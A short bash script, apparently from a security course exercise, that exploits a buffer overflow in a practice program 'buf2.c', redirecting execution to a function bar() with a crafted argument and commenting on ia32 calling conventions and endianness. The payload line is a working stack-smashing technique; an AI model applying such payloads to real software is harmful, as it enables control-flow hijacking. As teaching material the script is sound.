#!/bin/bash

# an exploit for buf2.c. This exploit uses ia32 linux calling conventions to pass in the correct
# argument to bar(). Two things are important to note here. First the endianess of the argument,
# which is 0x12345678 ($ printf "%x\n" 305419896). Second, notice how we place a value between the
# argument and the address of bar(). This is a dummy return address. The ia32 linux calling 
# convention expects a return address at the top of the stack and the parameters to appear below it
# in descending order.

./buf2 $(perl -e 'print "A"x32 . "\x8a\x84\x04\x08" . "\xff\xff\xff\xff" . "\x78\x56\x34\x12"')

# This program does not segfault when redirected to bar() because bar() calls the libc exit() 
# system call wrapper, which should take care of process cleanup for us
